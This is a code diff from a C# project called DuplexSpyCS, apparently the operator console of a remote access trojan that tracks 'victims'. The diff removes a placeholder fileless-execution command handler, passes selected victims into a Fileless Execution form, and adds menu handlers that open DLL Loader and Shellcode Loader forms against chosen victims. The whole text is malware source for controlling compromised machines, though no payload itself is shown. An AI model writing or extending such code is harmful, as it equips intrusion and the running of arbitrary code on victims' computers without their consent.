@@ -1374,18 +1374,6 @@ namespace DuplexSpyCS
                 }
 
                 #endregion
-                #region Fileless Execution
-
-                else if (cmd[0] == "fle") //Fileless Execution
-                {
-                    int nCode = int.Parse(cmd[1]);
-                    string szMsg = cmd[2];
-
-                    MessageBox.Show(nCode.ToString());
-                    MessageBox.Show(szMsg);
-                }
-
-                #endregion
                 #region Error
 
                 else if (cmd[0] == "error")
@@ -2250,15 +2238,14 @@ namespace DuplexSpyCS
             if (lsVictim.Count == 0)
                 return;
 
-            frmFilelessExec f = new frmFilelessExec();
-            f.m_lsVictim = lsVictim;
-
+            frmFilelessExec f = new frmFilelessExec(lsVictim);
+            f.Text = $"Fileless Execution | Victim{lsVictim.Count}";
             f.Show();
         }
 
         private void toolStripButton6_Click(object sender, EventArgs e)
         {
-            frmTipoff f = new frmTipoff(listener);
+            frmTipoff f = new frmTipoff(this);
             f.Text = "Tipoff Request";
             f.Show();
         }
@@ -2319,6 +2306,22 @@ namespace DuplexSpyCS
 
                 f.BringToFront();
             }
+        }
+
+        private void toolStripMenuItem46_Click(object sender, EventArgs e)
+        {
+            List<clsVictim> lsVictim = listView1.SelectedItems.Cast<ListViewItem>().Select(x => GetVictim(x)).ToList();
+
+            frmDllLoader f = new frmDllLoader(lsVictim);
+            f.Show();
+        }
+
+        private void toolStripMenuItem47_Click(object sender, EventArgs e)
+        {
+            List<clsVictim> lsVictim = listView1.SelectedItems.Cast<ListViewItem>().Select(x => GetVictim(x)).ToList();
+
+            frmShellcodeLoader f = new frmShellcodeLoader(lsVictim);
+            f.Show();
         }
     }
 }
